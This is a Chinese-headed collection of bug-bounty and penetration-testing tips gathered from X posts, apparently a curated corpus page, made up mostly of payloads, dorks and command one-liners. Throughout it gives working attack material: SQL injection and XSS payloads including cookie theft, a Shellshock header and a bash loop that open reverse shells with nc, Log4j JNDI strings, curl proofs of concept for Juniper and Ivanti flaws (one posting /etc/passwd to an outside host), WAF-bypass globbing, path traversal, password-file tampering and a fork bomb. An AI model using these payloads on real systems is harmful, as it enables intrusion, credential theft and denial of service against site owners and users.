# X 语料 · 方法论（2）

来源：X 公开贴子，经逐条人工阅读筛选后按技术主题归类。
仅收录纯文本正文，图片与外部媒体已被剥离。作者自述内容，未经复现验证。

> 原贴时间跨度为 2019-2026，条目均为作者自述、未经复现验证；部分技巧可能已随产品版本失效。
> 判定协议：[选题与探索](../hunting-strategy.md) · 索引与计数：[x-corpus.md](x-corpus.md) · 同类：x-methodology-1（300 条）、x-exp-mindset（69 条） · 本文 954 行

- param=' or 1=1#
  param=' or 1=1
  param=' or 1=1 //
  param= or 1=1#
  param=and or 1=1#
  param=' or 1=1
  ' or '1'='1
  -'
  ' '
  '&'
  '^'
  '*'
  ' or ''-'
  ' or '' '
- Now determine number of columns in the current table
  param=' or 1=1 order by 1#
  param=' or 1=1 order by x.x.x.x
  let say there are 3 columns
- .GIT files Dorks :-
  (intext:"index of /.git") ("parent directory")
  filetype:git -github.com inurl:"/.git"
  intitle:"index of" ".gitignore"
  ".git" intitle:"Index of"
  "Parent Directory" "Last modified" git
- Find All Allocated IP ranges for ASN given an IP address
  $ whois -h http://whois.radb.net -i origin -T route $(whois -h http://whois.radb.net $1 | grep origin: | awk '{print $NF}' | head -1) | grep -w "route:" | awk '{print $NF}' | sort -n
- BEST Open Redirect payload lists for
  1. Payloadbox - http://github.com/payloadbox/open-redirect-payload-list…
  2. PayloadsAllTheThings - http://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect…
  3. Hacktricks guide - http://book.hacktricks.xyz/pentesting-web/open-redirect…
- tip : fuzz api not only
  /api/v1/****
  fuzz :
  /api/v1/0.0.1/users/***
  /api/v1/0.0.2/0.1/users/***
  /apis/users/0-0-0/0.0.1
  /apis/users/0.0.1/1.0.0
- Ping Sweep - Bash
  for i in {1..254} ;do (ping -c 1 172.21.10.$i | grep "bytes from" &) ;done
  Ping Sweep - Windows
  for /L %i in (1,1,255) do @ping -n 1 -w 200 172.21.10.%i > nul && echo 192.168.1.%i is up.
- This makes it possible for an attacker to spoof these values to "admin" and "127.0.0.1".
  This gives access to the admin dashboard!
  Payloads
  1. role=ADMIN / X-Forwarded-For: 127.0.0.1
  2. role=ADMIN / X-Forwarded-For: localhost
- ▪ Replace the token with same length
  POST /register HTTP/1.1
  Host: http://target.com
  ...
  username=dapos&password=123456&token=aaaaaa
  To
  username=dapos&password=123456&token=aaabaa
- ▪ Changing POST / GET method
  POST /register HTTP/1.1
  Host: http://target.com
  ...
  username=dapos&password=123456&token=aaaaaaaaaa
  To
  GET /register HTTP/1.1
- 🏹Using @ or %40 character, browser will redirect to anything after the @
  /?redir=target.com@evil.com
  /?redir=http://target.com%https://evil.com
  Open Redirection
- found *.blob.core.windows.net ?
  just add : ?comp=list
  https://*.blob.core.windows.net/FOLDERNAME?comp=list
- 🏹 Method Override
  X-HTTP-Method-Override: PUT
  🏹 Provide full path GET
  GET https://vulnerable-website. com/ HTTP/1.1
  Host: evil-website. com
  GET /index.php HTTP/1.1
   Host: vulnerable-website. com
  Host: evil-website. com
- thread: decluttering lists of URLs
  first method:
  cat domains.txt | waybackurls | grep -Evi "(^(([^:\/?#]+):)?(//([^\/?#]*))?([^\?#]*)(\?([^#]*))?(#(.*))?)" | anew results.txt
- second method:
  cat domains.txt | waybackurls | grep -Pvi "\d+([?/|$])" | grep -Pvi "(blog|post)s?|docs|support/|/(\d{4}|pages?)/\d+/" | anew results.txt
- Web Cache Poisoning DoS (CPDoS)
  1 - GET /something/something/?q=10 ---> 200 O.K , Not Cached
  2 - GET /something/something/?q=+OR+1%3D2 ---> 503 , Cached
  3 - GET /something/something/?q=10 --> 503, Cache Response
- Tip: Used this payload /0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z/ in the URI Path.
- Test on CGI (cgi-bin) :
  User-Agent: () { :;}; echo $(</etc/passwd)
  () { :;}; /usr/bin/nc ip 1337 -e /bin/bash
- 📚 Gather Domains from Content-Security-Policy
  curl -vs URL --stderr - | awk '/^content-security-policy:/' | grep -Eo "[a-zA-Z0-9./?=_-]*" | sed -e '/\./!d' -e '/[^A-Za-z0-9._-]/d' -e 's/^\.//' | sort -u
- powershell-import /home/user/work/ShareFinder.ps1
  psinject 5209 x64 Invoke-ShareFinder -CheckShareAccess -Verbose | Out-File -Encoding ascii
  C:\ProgramData\shda.txt
- RCE WAF Bypass
  ;+$u+cat+/etc$u/passwd$u
  ;+$u+cat+/etc$u/passwd+\#
  /???/??t+/???/??ss??
  /?in/cat+/et?/passw?
- Flow:
  1. Dnsbrute and grep some subdomains
  2. Start directory fuzzing with .aspx extention
  3. Discovered Passwordresx.aspx and paste payload (' waitfor delay'0:0:20'--)
- Secondary context fuzzing: 📚
  /..%2f
  /..;/
  /../
  /..%00/
  /..%0d/
  /..%5c
  /..\
  /..%ff/
  /%2e%2e%2f
  /.%2e/
  /%3f (?)
  /%26 (&)
  /%23 (#)
  via https://samcurry.net/hacking-starbucks/… 100 million sbux accounts disclosure
  see also: https://docs.google.com/presentation/d/1N9Ygrpg0Z-1GFDhLMiG3jJV6B_yGqBk8tuRWO1ZicV8…
- Source code disclosure due to publicly available .git endpoint | P1 vulnerability
  Always check for endpoints related to /.git
- /.git/config
  /.git/logs/HEAD
  /.git/logs/refs/heads/master
  /.git/packed-refs
  /.git/refs/heads/master
  /.git/refs/remotes/origin/HEAD
  /.git/logs/refs/heads/master
- 1- fuzz website
  2- found this path /jk_status?cmd=dump = dump data
  3- search more about this misconfigure
  4- found /jk_status?opt=0 = read and write privilege
- 0neline for Extract sensitive end-point in JS :
  $cat main.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u
- Payload: //....//....//....//....//....//....//....//....//....//etc/passwd
  Parameter: path=
- Tip: if website block alert(0) you can replace it with alert `0 `
- echo https://target.com |gau|go/bin/waybackurls|sort -u | go/bin/wordlistgen |cut -f1 -d "."
  wordlist generator
- Endpoint: /phpmyadmin/scripts/setup.php
- iframe Injection
  1. iframes allowed, but only whitelisted domain
  2. Find "safe" external redirect or open redirect
  3. Payload:
  <iframe width="560" height="315" src="https://[whitelisted domain]/?redir=https://taksecPoC/iframexss.html"></iframe>
- Find Sensitive Files by bruteforcing these in Web paths.
  -> /.git
  -> /.gitkeep
  -> /.git-rewrite
  -> /.gitreview
  -> /.git/HEAD
  -> /.gitconfig
  -> /.git/index
  -> /.git/logs
  -> /.svnignore
  -> /.gitattributes
  -> /.gitmodules
  -> /.svn/entries
- RXSS submission payload
  %22%26%23x27%3B%3E%3CiFrAme%2Fsrc%3DjaVascRipt%3Aprompt.valueOf%28%29%281%29%3E%3C%2FiFramE%3E
  %3CsVg%2Fonload%3Dprompt%28document.cookie%29%3E
  Don't forget check note and tracking_info parameter if you see it in your target
- Evaluate hex and unicode obfuscated payloads to produce RCE.
  cat /etc/passwd ❏
  ↹ {\c''\a""t,/e''*?/?a?s??}
  ↹ {\c''\a""\t,/\e''*?/\p*\d}
- Tip: Always check for Directory Listing on wordpress wp-content/uploads/ folder, 90% it contains sensitive information.
- كانت جدا بسيطة بسبب خطأ في اعداد سيرفر IIS
  Exploit:
  https//anywebsite.com/c:/Windows/Win.ini
- tip:
  http://target.com/wp-config.php => 404 not found
  http://target.com/wp-config.php.swp… ==> 200 ok and downloaded
  after that if its contain encoded using hexadecimal decode it .
- If the normal multi slash or encoded payload doesn't work, double encode the payload:
  Payload: ".%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd"
- 🍪💣 Cookie Bomb 💣🍪
  URL that causes the cookie length to exceed request header limits for all requests until the cookie expires.
  1. Find a Cookie set by a parameter
  2. Inject as many commas as you can into the parameter until you DoS that user
- Add /wp-config.php.bk to your wordlists.
- This OneLiner extracts all API endpoints from AngularJS & Angular javascript files.
  curl -s URL | grep -Po "(\/)((?:[a-zA-Z\-_\:\.0-9\{\}]+))(\/)*((?:[a-zA-Z\-_\:\.0-9\{\}]+))(\/)((?:[a-zA-Z\-_\/\:\.0-9\{\}]+))" | sort -u
- 𝐔𝐬𝐢𝐧𝐠 "𝐠𝐫𝐞𝐩" 𝐭𝐨 𝗘𝘅𝘁𝗿𝗮𝗰𝘁 𝗨𝗥𝗟'𝘀 𝗳𝗿𝗼𝗺 𝗷𝘂𝗻𝗸 𝗱𝗮𝘁𝗮.
  cat file | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"*
  curl http://host.xx/file.js | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"*
- Browser-Based application LFI
  file:///etc/passwd blacklisted? Use "view-source:file:///etc/passwd"
  "view-source" is often forgotten by developers in blacklists.
- :(){ :|:& };katana -u $url -hl -nos -jc -silent -aff -kf all,robotstxt,sitemapxml -c 150 -fs fqdn |subjs | python3 /opt/JSA/jsa.py |goverview probe -N -c 500 |sort -u -t';' -k2,14 |cut -d ';'
- SQLi via parameter name injection.
  Payload:
  someparam[id) VALUES (NULL); WAITFOR DELAY '0:0:5';--]=test
- 𝐔𝐬𝐢𝐧𝐠 "𝐠𝐫𝐞𝐩" 𝐭𝐨 𝗘𝘅𝘁𝗿𝗮𝗰𝘁 𝗨𝗥𝗟'𝘀 𝗳𝗿𝗼𝗺 𝗷𝘂𝗻𝗸 𝗱𝗮𝘁𝗮.
  cat file | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"*
  curl http://host.xx/file.js | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"*
- fuzzing api not only: /api/v1/****
  fuzzing =
  /api/v1/0.0.1/users/***
  /api/v1/0.0.2/0.1/users/***
  /apis/users/0-0-0/0.0.1
  /apis/users/0.0.1/1.0.0
- Found a directory listing?
  You can use `wget -r --no-parent http://target.com/dir` to recursively fetch all the files (+structure) to your machine.
  Now you can view the structure, search, and grep in files.
- GET /api/getUser?id=1 --> 403
  GET / + X-Original-URL : /api/GetUser?id=1 --> 200
  source of the trick : https://cheatsheet.haax.fr/web-pentest/bug_bounty_tips/…
- add this file to your wordlist `.gitlab-ci.yml`
  its contain a database username and password
- If there is a WAF or filter to block RCE and LFI, you can bypass it with globbing.
  /usr/bin/cat /etc/passwd == /???/???/c?t$IFS/???/p?s?w?
- Endpoint: DELETE /user/<id>
  victim id = 1242
  1) Wrap ID with an array
  DELETE /user/[1242]
  2) Wrap ID with a JSON object
  DELETE /user/{"id":"1242"}
  3) Add the API version
  DELETE /v1/user/1242
  DELETE /v2/user/1242
  DELETE /v3/user/1242
- Browser-Based application LFI
  file:///etc/passwd blacklisted? Use "view-source:file:///etc/passwd"
  "view-source" is often forgotten by developers in blacklists.
- Google Dorks - Extensions:
  site:"example[.]com" ext:log | ext:txt | ext:conf | ext:cnf | ext:ini | ext:env | ext:sh | ext:bak | ext:backup | ext:swp | ext:old | ext:~ | ext:git | ext:svn | ext:htpasswd | ext:htaccess
  Find sensitive file leaks
- Google Dorks Open Redirect⚔️
  inurl:url=https
  inurl:url=http
  inurl:u=https
  inurl:u=http
  inurl:redirect?https
  inurl:redirect?http
  inurl:redirect=https
  inurl:redirect=http
  inurl:link=http
  inurl:link=https
  inurl:redirectUrl=http site:http://paypal.com
- Extract all URL from Source Code⚡️
  curl "https://TARGET.Com" | grep -oP '(https*.//|www\.)[^]*'
- 1. Download Alexa Top 1 million
  2. Fuzz /security.txt
  3. You can use this : https://github.com/markuta/go-security-txt…
  5. Get fresh BB Programs
- So, instead of using time-based stuff, you can use conditional-based?
  if(4148=4148,exp(~(1)),0)/*'XOR(if(4148=4148,exp(~(1)),0))OR'"XOR(if(4148=4148,sleep(10),0))OR"*/
  The list can be extended to tons of payloads.
- If we have JSON Login Page, Test Blind SQL Injection in Username or Password Field.
  𝗣𝗮𝘆𝗹𝗼𝗮𝗱:
  Username : "cybertix'; waitfor delay '0:0:8' --"
- Don't forget to test URL : 𝗵𝘁𝘁𝗽s://𝘀𝗶𝘁𝗲.𝗰𝗼𝗺/𝘄𝗽-𝗹𝗼𝗴𝗶𝗻?𝗮𝗰𝘁𝗶𝗼𝗻=𝗿𝗲𝗴𝗶𝘀𝘁𝗲𝗿 on any WordPress site
  Tip: You can register any WordPress account with a temporary email too
- Search for API patterns inside the api and try to use it to discover more.
  If you find /api/albums/<album_id>/photos/<photo_id>** **
  you could try also things like
  /api/posts/<post_id>/comment/. Use some fuzzer to discover this new endpoints.
- Add parameters
  Something like the following example might get you access to another user’s photo album:
  /api/MyPictureList → /api/MyPictureList?user_id=<other_user_id>
- Wildcard parameter in web API Pentesting
  Try to use the following symbols as wildcards: *, %, _, .
  ~ /api/users/*
  ~ /api/users/%
  ~ /api/users/_
  ~ /api/users/.
- Both of bugs it was a Unauthorized access to open dashboards
  Scan ports top 1000 everyday , everyday
  naabu -list sub.txt -top-ports 1000 -exclude-ports 80,443 -o file
- Leaking Creds.
  Endpoint "/.env"
- Modifying SAM
  modify the SAM file using the tool chntpw then change the password of the Administrator user using the tool available in KALI.
  chntpw -h
  chntpw -l <path_to_SAM>
  Inside a Linux system you could modify the /etc/shadow or /etc/passwd file
- whois -h 10.10.10.155 -p 43 "a') or 1=1#" extract all the information saved in the whois database.
- ICMP
  use nmap to send other types of ICMP packets
  ping -c 1 199.66.11.4 # 1 echo request to a host
  fping -g 199.66.11.0/24 # Send echo requests to ranges
  nmap -PEPM -sP -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
- UDP Port in Network Pentesting
  nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
- SCTP Port Discovery
  nmap -T4 -sY -n --open -Pn <IP/range>
- assetfinder --subs-only http://test.com | httprobe | tee 1.txt
  above command gets you the live subs of a domain and save it to text file 1.txt
- ReverseSSH
  1. Prepare locally to catch the ssh port forwarding request:
  wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86… -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh
  /dev/shm/reverse-ssh -v -l -p 4444
- If you happen to find Symfony Web Framework that has Symfony profiler debug mode enabled, fuzz the following endpoints:
  - /app_dev.php
  - /app_dev.php/_profiler/phpinfo
  - /app_dev.php/_profiler
  - Look for "profiler token" in phpinfo()
- Common Headers for Host Header Injection Attack:-
  1. Host:
  2. X-Host:
  3. X-Forwarded-For:
  4. X-Forwarder- Host:
  5. X-Forwarder- Server:
  6. Forwarded:
  7. X-HTTP-Host- Override:
  8. X-Forwarded-Proto headers:
- 1- Found endpoint in waybackurls: /core/Filemanager/index.html?type=Images&CKEditor=full_story&CKEditorFuncNum=110&langCode=en
  2- upload any file
  3- intercept request in body they show default path for uploading files
  4- change it to any directory
- Log4j 2.16 vulnerability DoS 🫰
  - Paylaod: ${${::-${::-$${::-j}}}}
  refer to: https://issues.apache.org/jira/browse/LOG4J2-3230……
- Some dorks for public bug bounty programs🚨
  inurl /bug bounty
  inurl : / security
  inurl:security.txt
  inurl:security "reward"
  inurl : /responsible disclosure
  inurl : /responsible-disclosure/ reward
- Title:- Unauthenticated varnish cache purge.
  Severity:- Low
  To identify the bug 🪲
  [ curl -X PURGE https://target[.]com ]
  Observe the response . If the response contain status : Ok
- 4.0.0 <= Joomla <= 4.2.7
  /api/index.php/v1/config/application?public=true
  You can see the database configuration information!
- Bug Bounty Tip⚔️
  Tomcat path traversal via nginx reverse proxy mapping using /..;/ payload
  Example: image/..;/hidden
  Attack Flow:
  -> image/..;/hidden (nginx input)
  -> image/../hidden (tomcat)
  -> hidden (final path)
- Information disclouse issue i have found in a big company months ago
  site:*.target.* intext:.@gmail.com
- dirsearch -u http://testphp.vulnweb.com --exclude-status=301,404,500,508,302,403,400,444 -w /home/kali/Desktop/wordlist/mywordlist.txt --remove-extensions js,png,jpeg,gif
- Good old Forced Browsing 💯
  1. Noticed 403 for “/.git”
  2. Kept knocking at different doors
  3. Door # “.git/config” & “.git/index” were unlocked
  4. Dumped repo locally
  5. Analyzed all items and located “config.php” containing secrets, prod credentials
- Quick tip - If '/something' => 403 Try - '/something/' '/something/%20' '/something.html' '/something.json '/something/?anything' '/something#' Works sometimes
- By default , An empty bit value (b'') evaluates to a zero-length binary string
  You can use
  xx' or b'' = 0 --+ = true
  xx' OR if(b''=0,sleep(5),1)--+
  if the server sleep for 66 sec (13x5=(65)+1 server time)
- Found a bug that leads to account takeover:
  1. Forget the password and get a link.
  2. Check if the link can be used multiple times.
  3. Search that token with the keyword on waybackurls. (example: "forget_token=").
  4. Account takeover.
- Extract URLs/Endpoints:
  curl http://targetsite.com -s | sed s/href=/"endpoint:"/g | sed s/" "/"\n"/g | tr "<>" "\n" | grep endpoint:
  curl http://targetsite.com -s | sed s/src=/"endpoint:"/g | sed s/" "/"\n"/g | tr "<>" "\n" | grep endpoint:
- add for your wordlist
  (common/config.php.new)
- If you find a LFI ignore /etc/passwd and go for /var/run/secrets/kubernetes.io/serviceaccount this will raise the severity when you hand them a kubernetes token or cert.
- put this path in your wordlist
  /common/config.php.new
- Pro Tip - Android applications can suffer from LFI and stored XSS just by injecting <iframe/src=/etc/hosts> into input fields.
- Oneliner + A collection of special paths linked to major web frameworks and infrastructure projects, known juicy APIs, misconfigurations.. etc.
  dirsearch -l 200HTTP --full-url -F -w leaky-paths.txt
  https://github.com/ayoubfathi/leaky-paths/tree/main…
- site:*.exmaple.com inurl:users
- Quick tip
  - /robots.txt -> 404 Not Found
  - /robots.txt.dist -> Downloaded
- Nice ways to leverage SQLI Injection to LFI and RCE
  LFI:
  item=&search='+Union+Select+1,2,3,4,5,6,load_file("/etc/passwd")#
  RCE:
  Uploading a shell
- When coming across to testing API's, changing the versions from v2 to v1, can lead sometimes to mass-data disclosure.
  1. Access /v2/applications - 200 OK (No Applications)
  2. Access /v1/applications - 200 (All Users Applications)
- Google has lots of information indexed that can help you find external programs as well as information relating to your specified company. Here are some popular search queries:
  1. inurl:responsible disclosure
- Extract endpoints from javascript files:
  cat FILE.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u
- Handy command to extract URLs from junk / assorted data:
  cat file | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"*
- HTML Injection in mail
  1. Signup with HTML payload in FirstName
  2. Check mail.
  3. No HTML injection found.
  4. Go to forgot password and submit it.
  5. Check the email.
  6. HTML code executed in the mail.
- DB credentials are stored in the file `config/const.DB.php.bak`
- Try input No TLD in Email Value of the Parameter
  Example:
  POST /reset
  […]
  email=victimemail@mail.secry
  POST /reset
  […]
  email=victim@mail.com%0a%0dcc:hacker@secry.me
- Files Containing Juicy Info inurl:"/.vscode/sftp.json"
- Juniper Web Device Manager - RCE
  CVE-2023-36845
  curl "http://xxxx:xxxx/?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"' -X POST
- Reverse Shell Bash Loop:
  while true; do sleep 5 && mknod /dev/shm/p p; cat /dev/shm/p | /bin/bash -i | nc 127.0.0.1 9001 >/dev/shm/p; done
- finally Juniper - Remote Code Execution 🔥 ( CVE-2023-36845 )
  Shodan Dork : title:"Juniper" http.favicon.hash:2141724739
  Poc: curl <TARGET> -F $'auto_prepend_file="/etc/passwd\n"' -F 'PHPRC=/dev/fd/0'
  CVE-2023-36845 RCE
- When testing AEM, it's always good to try different HTTP verbs like GET, POST, PUT, and DELETE on other pages:
  PUT /api/assets/evil..js HTTP/1.1
  You may get lucky and be able to create or delete assets.
- Bypassing AEM dispatcher filters can be difficult, but it is also possible to use path traversals to break the dispatcher filters that are in place.
  /content/..;/crx/de/index.jsp
- Crazy Aliyun WAF Bypass:
  cat /etc/hosts - triggers WAF
  tac /etc/hosts - 🧙‍♂️
- Google dorking for urls that include parameters only? Better use:
  inurl:"%3F" site:microsoft[.]com
  than variations of:
  inurl:"?" OR inurl:"&" site:microsoft[.]com
  *Useful when searching for symbols in urls generally.
- AG Grid is one of the more expensive licenses you can find while doing a secure code review. Look for `setLicenseKey`.
- New tip
  1- Fuzz target
  2- phpmyadmin/setup/index.php --> 403
  3- phpMyAdminOLD/setup/index.php --> 200
  add phpMyAdminOLD/setup/index.php to your wordlist
- For accessing the environment file ..
  - /env/.config
  - .env/config
  Add "/.env.example" to your wordlist, It's helpful and giving results.
- Quick tip
  wp-config.php -> 403 forbidden
  wp-config.php.bak -> 200 ok
  The file download and contained the DB credentials, other sensitive date leaked in it
- When testing an AEM instance if access to /crx/de/index.jsp is blocked by dispatcher filters, try:
  /content/..;a=a/crx/de/index.jsp/.css
  /content/..;a=a/crx/de/index.jsp;.css
  /content/..;a=a/crx/de/index.jsp?.css
- When testing the API field with UUID type, try to change the UUID value type to ID or even an Email
  /api/user/a8ae-1322-ac09-8f90
  /api/user/1
  /api/user/user@company.com
- Found id param? Try id/../id2, you might get lucky
- tip :
  http://target.com/wp-config.php => 404 not found
  http://target.com/wp-config.php.… ==> 200 ok and downloaded
  wp-config.php.swp ==>>200 ok
  after that if its contain encoded using hexadecimal decode it .
- OneLiner Extract URLs from Source Code⚙️
  curl "https://TARGET.Com" | grep -oP '(https*.//|www\.)[^]*'
- If you encounter the Symfony framework;
  AdminPanel Controller :: index field or ;
  /profiler/token?panel=request
  I recommend you to look at the url endpoint,
  In older versions it is generally as follows;
  /_profiler/phpinfo
- Browser-Based application LFI
  file:///etc/passwd blacklisted? Use "view-source:file:///etc/passwd" "view-source" is often forgotten by developers in blacklists.
- If there is a WAF filtering your RCE (Remote Code Execution) and LFI (Local File Inclusion) payloads, you can try to bypass it with globbing.
  /usr/bin/cat /etc/passwd == /???/???/c?t$IFS/???/p?s?w?
- If accessing “/.git” directory returns 403 Forbidden, try accessing a common subdirectory like “/.git/config”.A "forbidden" .git doesn't necessarily mean "forbidden" subdirectories
- curl https://chaos-data.projectdiscovery.io/index.json | jq -M '.[] | .URL | @sh' | xargs -I@ sh -c 'wget @ -q'; mkdir bounty ; unzip '*.zip' -d bounty/ ; rm -rf *zip ; cat bounty/*.txt >> allbounty ; sort -u allbounty >> domainsBOUNTY ; rm -rf allbounty bounty/ ; echo '@OFJAAAH'
- add `/metrics` to your wordlist to view Prometheus metrics , it makes you able to find some hidden/internal paths with status code .
- 🔎 WordPress Bug Bounty Tip
  🗄️ Add this endpoints in your wordpress fuzz wordlist.
  wp-config.php.old
  wp-config.php
- payload: \u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(document.domain)\u0022\u003e
- Often when you gather URLs of a target you find some google spreadsheet links that return 404, just copy the file KEY and change the link:
  spreadsheets*google*com/feeds/list/KEY -> 404
  docs*google*com/spreadsheets/u/0/d/KEY/pub -> 200
- Title:- bitly credentials disclosed in source code 🐞
  drupal site: core/install.php path is accessible, credentials visible in page source code.
- Network Scanning
  1:IP resolution
   https://github.com/Josue87/resolveDomains…
  resolveDomains -d subdomains.txt
  2:Netdiscover
  netdiscover -i eth0
  netdiscover -r 10.11.1.1/24
  3:Nmap
  nmap -sn 10.11.1.1/24
  nmap -sn 10.11.1.1-253
  nmap -sn 10.11.1.*
- Starts with expected folder such as /var/www/images. We can see this in the request also.
   Payload used to get etc/passwd is:
  filename=/var/www/images/../../../etc/passwd
- Bug-Bounty-Tip:
  Add "/config.env.js" Endpoint in your list! Pretty sensitive information there!
- Simple tip for port scan
  1) after enumerat your subdomains save in subs.txt
  2) run this command
  "cat subs.txt | dnsx -a -ro | naabu -silent -top-ports 1000 -exclude-ports 80,443,21,22,25 -o ports.txt"
- Get params from js files, example you have a directory js-files with many js files inside. Run this command
  grep -Eo '(var|let) ([A-Za-z0-9_]+){2,}' -R js-files | cut -d' ' -f2
- Make sure to check whether the IVANTI targets are update🥳
  Poc:
  https :// [ivanti-ip/domain]/api/v1/license/keys-status/;curl -X POST -d @/etc/passwd oastify[.]xxxxx
- one-liner to get root directories (http://target.com/root_dir) of the targeted domain:
  cat waymore.txt | grep -oP '^https?://(?:[^/]*/){2}' | sort -u | tee root-dirs.txt
  Could use this on gau, linkfinder or katana output as well.
- 👋 LFI Payload
  Payload:
  ".%252e/.%252e/.%252e/.%252e/.%252e/.%252e/.%252e/etc/passwd"
- If there is a route to /blog
  don't forget to test /blog/.env
  you might have a nice surprise
- 𝗖𝗥𝗟𝗙 𝗜𝗻𝗷𝗲𝗰𝘁𝗶𝗼𝗻 𝗕𝘆𝗽𝗮𝘀𝘀 𝘂𝘀𝗶𝗻𝗴 𝗚𝗕𝗞 𝗘𝗻𝗰𝗼𝗱𝗶𝗻𝗴
  GET /Cybertix ==> 404 Not Found
  GET /%0D%0A%20Set-Cookie:cybertix=1 ==> 400 Bad Request
  GET /%E5%98%8D%E5%98%8Set-Cookie:cybertix-1 ==> 𝟮𝟬𝟬 𝗢𝗞
- CVE-2024-23334
  Poc for windows: /static/../D:\flag.txt
  Poc for Linux: /static/../../../../etc/passwd [need to fuzz "../"]
  https://gist.github.com/W01fh4cker/2b570b1d0df40aa94808184c231d7ecb…
- curl -s "http(s)://plugins.svn.wordpress(.)org/" | grep "<li>" | cut -d '"' -f2 | sed 's/\///g' > list.txt
  لاتنسى تحذف () ✌️
- If you find Web frameworks like Symfony, add '/app_dev.php/_profiler/open?file=app/config/parameters.yml' to the wordlist
- Found /.git/config while fuzzing ( medium )
  used GitTools : https://github.com/internetwache/GitTools… to dump whole .git directory form server
  Found DB creds in dumped files which are not accessible directly ( Critical )
- 𝗗𝗲𝘁𝗲𝗰𝘁 𝗫𝗦𝗦 𝘄𝗶𝘁𝗵 𝗗𝗮𝗹𝗳𝗼𝘅
  cat http://target.com | gau --subs | grep "https://" | grep -v "png\|jpg\|css\|js\|gif\|txt" | grep "=" | uro | dalfox pipe --deep-domxss --multicast --blind https://chirag.bxss.in
- People miss critical vulnerabilities because they assume a GET request can't have a body
  This is how you can send such a request using curl:
  $ curl '0.0.0.0:1234/download?filename=TEST' --data 'filename=../../../../../../../etc/passwd' -X GET
- Use this one-liner to get a lot of fuzz endpoints from the crawler:
  cat targets.txt | hakrawler -d 5 -dr -insecure -t 10 -timeout 360 | tee hakrawler.txt
- Add to your wordlist
  /ganglia/
  /ganglia/?c=ElastiCluster&m=load_one&r=hour&s=by%20name&hc=4&mc=2
- Log4j 🙌 Application was running java
  Vulnerable header :
  X-Forwarded-For: ${jndi:ldap://${:-874}${:-705}.${hostName}.xforwardedfor.<Server-link>}
- Unprivileged user able to fetch UUID of other users from this endpoint: ``/api/v1/REDACTED/subordinate_employees.json``. Copy paste the disclosed UUID in another vulnerable endpoint ``https://target.tld/UUID`` to fetch full PII information.
- You can now passively enumerate all endpoints of a website with katana. (No need waybackurls)
  Example:
  echo target | katana -passive -f qurl -pss waybackarchive,commoncrawl, alienvault | tee endpoints
- Add ‘wp-config.phpold’ to your list
- Account takeover with JSON 💥
  {"password":"1234",token="123"} ->200 0K
  {"password":"1234","email":"victm@gmail.com","token="123"} ->200 0K
  Hidden email add
- Param Mining
  echo "target" | gau | sort -u | xargs -P 1 -I {} sh -c 'echo "param mining => {}" && arjun -u "{}" -m HEADERS'
  echo "target" | gau | sort -u | xargs -P 1 -I {} sh -c 'echo "param mining => {}" && arjun -u "{}" -m POST'
- Add 'master.passwd/master.passwd.txt' to the wordlist
- Discovering the versions of multiple IP addresses with nmap:
  Execute the following command:
  nmap -sV -T5 -iL ips.txt
- cat urls.txt | sed 's/=/=(CASE%20WHEN%20(888=888)%20THEN%20SLEEP(5)%20ELSE%20888%20END)/g' | xargs -I{} bash -c 'echo -e "\ntarget : {}\n" && time curl "'{}'"'
- 🔰Dump URLs from sitemap.xml:
  curl -s http://HOST/sitemap.xml | xmllint --format - | grep -e 'loc' | sed -r 's|</?loc>||g'
- Extract JS Files from waybackurls :
  cat waybackurls.txt | grep ".js$" | tee jsfiles
- Files Containing Juicy Info inurl:"/.vscode/sftp.json
- If you are trying to access an endpoint and get 403
  try this
  /api/docs/index.html ==> 403 Forbidden
  /api/Docs/index.html ==> 200 Ok
- One command line to extract javascript files and collect hidden endpoints
  $ echo "http[s]://redacted.com" | subjs | while read -r jsfile; do python3 linkfinder.[py] -i [$]jsfile -d; done
- /config.php.old
  /config.php.bak
- gau or katana or waymore -> urldedupe -> qsreplace -> uro -> dalfox / knoxss
- ------------------
  alert(1) = 403
  alert `1` = 403
  ------------------
  alert?.(1) = 200
  ------------------
- A quick one-liner to get most of the wildcard domains of BBPs:
  curl -s https://raw\.githubusercontent.com/projectdiscovery/public-bugbounty-programs/main/chaos-bugbounty-list.json | jq ".[][] | select(.bounty==true) | .domains[]" -r
- LazyEgg extracts links, images, cookies, forms, JS URLs,
  localStorage, Host, IP, and leaked credentials from target.
  cat target | xargs -I{} bash -c 'echo -e "\ntarget : {}\n" && python lazyegg[.]py "{}" --js_urls --domains --ips --links --images'
- LazyEgg - Hunting JS Files
  waybackurls target | grep '\.js$' | awk -F '?' '{print $1}' | sort -u | xargs -I{} bash -c 'echo -e "\ntarget : {}\n" && python lazyegg[.]py "{}" --js_urls --domains --ips'
- Endpoint: "/.env"
- Add 'app/etc/local.xml' to the wordlist
- One-liner to find JavaScript files quickly using multiple tools:
  echo target\.com | (gau || hakrawler || gospider || katana) | grep -iE '.js'| grep -iEv '(.jsp|.json)' | anew js.txt
- waybackurls --dates domain(.)com | grep '?id='
  Payload : if(now()=sysdate(),SLEEP(8),0)
- “/api/v2/user/search/?query=&page=1&page_size=20” was disclosing the PII details
- found a passport on specific endpoint ==>
  visit app[.]com/xxxx/cnd/ ==> dir listing open
  and the results is tons of PII🤠
  don't forget checking (jpg/jpeg/etc..) all the time
- Did you find the Slack hook token during bug bounty and want to check if it's a valid token or not?
  Use the curl command below to validate it.
  curl -s -X POST -H "Content-type: application/json" -d '{"text":""}' "https://hooks.slack.com/services/<TEAM_ID>/<CHANNEL_ID>/<HOOK_TOKEN>"
- 🔍 Searching for an easy low vulnerability?
  Try this command:
